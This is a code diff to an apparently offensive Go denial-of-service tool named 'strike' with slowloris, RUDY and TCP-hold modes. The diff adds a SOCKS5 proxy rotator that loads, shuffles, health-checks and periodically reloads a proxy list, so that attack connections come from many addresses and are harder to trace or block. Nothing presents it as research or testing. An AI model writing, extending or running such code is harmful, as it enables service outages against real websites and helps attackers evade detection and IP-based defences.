@@ -1,12 +1,15 @@
 package main
 
 import (
+	"bufio"
 	"crypto/tls"
 	"flag"
 	"fmt"
+	"math/rand"
 	"net"
 	"net/url"
 	"os"
+	"strings"
 	"sync"
 	"sync/atomic"
 	"time"
@@ -15,19 +18,150 @@ import (
 )
 
 var (
-	mode     = flag.String("mode", "slowloris", "slowloris|rudy|tcphold")
-	target   = flag.String("target", "", "host:port (e.g. example.com:443)")
-	path     = flag.String("path", "/", "URL path")
-	workers  = flag.Int("c", 30, "concurrent connections")
-	delay    = flag.Int("delay", 10, "delay between bytes (seconds)")
-	duration = flag.Int("duration", 900, "max duration (seconds)")
-	sni      = flag.String("sni", "", "TLS SNI (default: host from target)")
-	proxyURL = flag.String("proxy", "", "SOCKS5 proxy (e.g. socks5://127.0.0.1:9050)")
+	mode      = flag.String("mode", "slowloris", "slowloris|rudy|tcphold")
+	target    = flag.String("target", "", "host:port (e.g. example.com:443)")
+	path      = flag.String("path", "/", "URL path")
+	workers   = flag.Int("c", 30, "concurrent connections")
+	delay     = flag.Int("delay", 10, "delay between bytes (seconds)")
+	duration  = flag.Int("duration", 900, "max duration (seconds)")
+	sni       = flag.String("sni", "", "TLS SNI (default: host from target)")
+	proxyURL  = flag.String("proxy", "", "SOCKS5 proxy (e.g. socks5://127.0.0.1:9050)")
+	proxyFile = flag.String("proxy-file", "", "file with SOCKS5 proxies (one per line, format: socks5://host:port)")
+	proxyRefresh = flag.Int("proxy-refresh", 300, "refresh proxy list every N seconds")
 
 	connects  uint64
 	disconns  uint64
 	bytesSent uint64
 )
+
+type ProxyRotator struct {
+	mu       sync.Mutex
+	proxies  []string
+	dead     map[string]int // failure count
+	index    int
+	timeout  time.Duration
+}
+
+func NewProxyRotator(file string, timeout time.Duration) (*ProxyRotator, error) {
+	r := &ProxyRotator{
+		dead:    make(map[string]int),
+		timeout: timeout,
+	}
+	if err := r.loadFile(file); err != nil {
+		return nil, err
+	}
+	if len(r.proxies) == 0 {
+		return nil, fmt.Errorf("no proxies loaded")
+	}
+	// Shuffle for initial diversity
+	rand.Shuffle(len(r.proxies), func(i, j int) {
+		r.proxies[i], r.proxies[j] = r.proxies[j], r.proxies[i]
+	})
+	fmt.Fprintf(os.Stderr, "[strike] loaded %d proxies\n", len(r.proxies))
+	return r, nil
+}
+
+func (r *ProxyRotator) loadFile(file string) error {
+	f, err := os.Open(file)
+	if err != nil {
+		return err
+	}
+	defer f.Close()
+	var list []string
+	sc := bufio.NewScanner(f)
+	for sc.Scan() {
+		line := strings.TrimSpace(sc.Text())
+		if line == "" || strings.HasPrefix(line, "#") {
+			continue
+		}
+		if !strings.HasPrefix(line, "socks5://") {
+			line = "socks5://" + line
+		}
+		list = append(list, line)
+	}
+	r.mu.Lock()
+	r.proxies = list
+	r.index = 0
+	r.mu.Unlock()
+	return nil
+}
+
+func (r *ProxyRotator) GetDialer() proxy.Dialer {
+	r.mu.Lock()
+	defer r.mu.Unlock()
+
+	if len(r.proxies) == 0 {
+		return proxy.Direct
+	}
+
+	// Try proxies until we find one not marked dead
+	for attempts := 0; attempts < len(r.proxies); attempts++ {
+		p := r.proxies[r.index]
+		r.index = (r.index + 1) % len(r.proxies)
+
+		if r.dead[p] >= 3 {
+			continue
+		}
+
+		u, err := url.Parse(p)
+		if err != nil {
+			r.dead[p] = 999
+			continue
+		}
+
+		d, err := proxy.FromURL(u, &net.Dialer{Timeout: r.timeout})
+		if err != nil {
+			r.dead[p] = 999
+			continue
+		}
+		return d
+	}
+	// All proxies dead — try direct as last resort
+	return proxy.Direct
+}
+
+func (r *ProxyRotator) MarkDead(proxyURL string) {
+	r.mu.Lock()
+	r.dead[proxyURL]++
+	r.mu.Unlock()
+}
+
+func (r *ProxyRotator) refreshLoop(file string, interval time.Duration, stop <-chan struct{}) {
+	t := time.NewTicker(interval)
+	defer t.Stop()
+	for {
+		select {
+		case <-t.C:
+			if err := r.loadFile(file); err == nil {
+				fmt.Fprintf(os.Stderr, "[strike] refreshed: %d proxies\n", len(r.proxies))
+			}
+		case <-stop:
+			return
+		}
+	}
+}
+
+var globalRotator *ProxyRotator
+
+func getDialer() proxy.Dialer {
+	if globalRotator != nil {
+		return globalRotator.GetDialer()
+	}
+	if *proxyURL != "" {
+		u, err := url.Parse(*proxyURL)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "[strike] bad proxy URL: %s\n", *proxyURL)
+			os.Exit(1)
+		}
+		d, err := proxy.FromURL(u, proxy.Direct)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "[strike] proxy error: %v\n", err)
+			os.Exit(1)
+		}
+		return d
+	}
+	return proxy.Direct
+}
 
 func main() {
 	flag.Parse()
@@ -52,6 +186,19 @@ func main() {
 	}
 
 	deadline := time.Now().Add(time.Duration(*duration) * time.Second)
+
+	// Initialize proxy rotator if -proxy-file is set
+	if *proxyFile != "" {
+		rot, err := NewProxyRotator(*proxyFile, 10*time.Second)
+		if err != nil {
+			fmt.Fprintf(os.Stderr, "[strike] proxy-file error: %v\n", err)
+		} else {
+			globalRotator = rot
+			stop := make(chan struct{})
+			go rot.refreshLoop(*proxyFile, time.Duration(*proxyRefresh)*time.Second, stop)
+			defer close(stop)
+		}
+	}
 
 	fmt.Fprintf(os.Stderr, "[strike] mode=%s target=%s conns=%d delay=%ds duration=%ds\n",
 		*mode, *target, *workers, *delay, *duration)
@@ -85,23 +232,6 @@ func tlsConfig() *tls.Config {
 		InsecureSkipVerify: true,
 		MinVersion:         tls.VersionTLS12,
 	}
-}
-
-func getDialer() proxy.Dialer {
-	if *proxyURL == "" {
-		return proxy.Direct
-	}
-	u, err := url.Parse(*proxyURL)
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "[strike] bad proxy URL: %s\n", *proxyURL)
-		os.Exit(1)
-	}
-	d, err := proxy.FromURL(u, proxy.Direct)
-	if err != nil {
-		fmt.Fprintf(os.Stderr, "[strike] proxy error: %v\n", err)
-		os.Exit(1)
-	}
-	return d
 }
 
 // ========== Slowloris ==========
